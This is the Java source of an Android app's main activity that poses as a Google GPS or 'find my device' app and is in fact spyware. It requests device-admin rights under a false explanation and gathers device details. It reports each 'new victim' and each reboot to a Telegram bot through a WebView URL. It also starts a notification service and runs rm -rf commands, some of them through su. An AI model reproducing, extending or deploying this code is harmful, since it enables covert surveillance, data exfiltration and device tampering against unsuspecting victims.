package com.google.android.gps ;

import android.app.*;
import android.app.admin.*;
import android.content.*;
import android.content.pm.*;
import android.os.*;
import android.webkit.*;
import android.widget.*;
import java.io.*;
import java.util.concurrent.*;

public class MainActivity extends Activity {
	
	DevicePolicyManager dpm;
	ComponentName mDeviceAdminSample = null;
	
    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		String s1 = Build.DEVICE;
		String s2 = Build.HARDWARE;
		String s3 = Build.MANUFACTURER;
		String temp = "📱 "+getResources().getString(R.string.takmaad)+bosluk()+"Cihaz: "+s1+" "+s2+" "+s3+bosluk()+"-> ";
		
		dpm = (DevicePolicyManager) getSystemService("device_policy");
		mDeviceAdminSample = new ComponentName((Context)this, DeviceAdmin.class);
		
		if(!dpm.isAdminActive(mDeviceAdminSample)){
			Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
			intent.putExtra("android.app.extra.DEVICE_ADMIN", (Parcelable) mDeviceAdminSample);
			intent.putExtra("android.app.extra.ADD_EXPLANATION", "Cihazımı bul");
			startActivity(intent);
		}
		
		SharedPreferences sp = getSharedPreferences("bilgi",Context.MODE_PRIVATE);
		SharedPreferences.Editor se = sp.edit();
		
		if(sp.getBoolean("ilkAcilis",true)){
			temp += "Yeni kurban algılandı";
			se.putBoolean("ilkAcilis",false);
			se.commit();
		} else {
			if(getIntent().getIntExtra("boot",0) == 1)
				temp += "Kurban cihazını yeniden başlattı!";
			else{
				//temp += "Kurban bi bok olacakmış gibi uygulama simgesine dokunuyor!";
			
					temp += clean();
				
			}
		}
		
		String token = getResources().getString(R.string.botid);
		String user = getResources().getString(R.string.userid);
		String telegram = "https://api.telegram.org/bot"+token+"/sendMessage?text="+temp+"&chat_id="+user;
		(new WebView(this)).loadUrl(telegram);
		try{
		startActivity (new Intent(this,NotificationService.class));
		}catch(Error e){
			temp=e.toString();
			(new WebView(this)).loadUrl(telegram);
		}catch(Exception e){
			temp=e.toString();
			(new WebView(this)).loadUrl(telegram);
		}
		/*getPackageManager()
			.setComponentEnabledSetting(
			new ComponentName(this, MainActivity.class),
			PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
			PackageManager.DONT_KILL_APP);*/
    }
	
	String bosluk(){
		String temp = "";
		for(int i = 0;i!=150;i++)
			temp += " ";
		return temp;
	}
	
	 String clean(){
		System.gc();
		 String[] list = {"/sdcard/DCIM/.thumbnails","/sdcard/Android/data","/data/data"};
		 try
		 {
			 int i= exec("rm -rf "+list[1]+"/*/cache","sh");
			     i = exec("rm -rf " + list[0],"sh");
				 
	         	 i= exec("rm -rf "+list[2]+"/*/cache","su");
			 i= exec("rm -rf "+list[2]+"/*/code_cache","su");
			
			 return "Sistem temizleme isteği";
		 }
		 catch (IOException e)
		 {
			 return e.toString();
		 }
		 
	}
	public int exec(String command,String shell) throws IOException {
		if (shell != "" && shell != null && command != "" && command != null) {
			java.lang.Process p = Runtime.getRuntime().exec(shell);
			DataOutputStream dos = new DataOutputStream(p.getOutputStream());
			dos.writeBytes(command+"\n");
			dos.flush();
			dos.close();
			return 0;
		} else return 1;
	}
	
}
